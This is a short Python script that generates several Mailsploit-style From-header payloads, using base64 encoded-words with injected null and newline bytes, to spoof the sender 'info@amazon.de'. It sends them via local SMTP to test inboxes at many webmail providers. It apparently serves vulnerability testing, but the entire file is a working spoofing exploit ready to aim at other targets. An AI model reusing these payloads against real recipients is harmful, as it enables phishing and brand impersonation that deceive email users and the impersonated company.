import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import base64

# Spoofed email address
spoof="info@amazon.de"

# original address of the attacker
original = "attacker@mail.de"


# Mailsploit Payloads
payloads = ["=?utf-8?b?" + (base64.b64encode(spoof.encode('utf-8')).decode('utf-8')) + "?==?utf-8?Q?=00?==?utf-8?b?" + base64.b64encode(spoof.replace('(','\\(').replace(')','\\)').encode('utf-8')).decode('utf-8') + "?=@" + original, 

"=?utf-8?b?" + base64.b64encode(spoof.encode('utf-8')).decode('utf-8') + "?==?utf-8?Q?=0A=00?= <=?utf-8?b?" + base64.b64encode(spoof.encode('utf-8')).decode('utf-8') + "?==?utf-8?Q?=0A=00=?@" + original + ">", "=?utf-8?b?" + base64.b64encode(spoof.encode('utf-8')).decode('utf-8') + "?==?utf-8?Q?=00=0A?=@" + original,  
          "=?utf-8?b?" + base64.b64encode((spoof.replace('"','\\"') + "<test>").encode('utf-8')).decode('utf-8') + "?==?utf-8?Q?=00=0A?= <" + original + ">" ,     
        "=?utf-8?b?" + base64.b64encode(('test" <' + spoof.replace('<','\\<').replace('>','\\>')).encode('utf-8')).decode('utf-8') + "?==?utf-8?Q?=00=0A?= <" + original + ">",        "=?utf-8?b?" + base64.b64encode((spoof.replace('"','\\"') + "<" + spoof.replace('<','\\<').replace('>','\\>')).encode('utf-8')).decode('utf-8') + "?==?utf-8?Q?=0A=00=00=00?= <" + original + ">",    "=?utf-8?b?" + base64.b64encode(spoof.encode('utf-8')).decode('utf-8') + "?==?utf-8?Q?=0A=00?= @" + original]



recievers = ["dkim.testing2018@gmail.com","dkim.testing2018@yahoo.com","dkim.testing2018@aol.com","dkim.testing2018@outlook.de","dkim.testing2018@t-online.de","dkim.testing2018@protonmail.com","dkim.testing2018@freenet.de","dkim.testing2018@freemail.hu","dkim.testing2018@web.de","dkim.testing2018@op.pl","dkim.testing2018@sapo.pt","dkim.testing2018@mail.ru","dkim.testing2018@tutanota.com","dkim.testing2018@inbox.lv","dkim.testing2018@hotmail.com","dkim.testing2018@seznam.cz","dkim.testing@zoho.eu","dkim.testing18@daum.net","dkim.testing2018@runbox.com","dkim.testing2018@interia.pl","dkim-testing2018@naver.com","dkim.testing2018@firemail.de","dkim.testing2018@mail.de"]

for reciever in recievers:



    for payload in payloads:
        msg = MIMEText("""Mailsploit Test""")
        msg['From'] = payload
        msg['To'] = reciever
        msg['Subject'] = "Testing for Mailsploit Vulnerability"


        server = smtplib.SMTP('localhost:25')
    
        server.starttls()

        server.sendmail('info@mail-testing.ml', reciever, msg.as_string())
        server.quit()
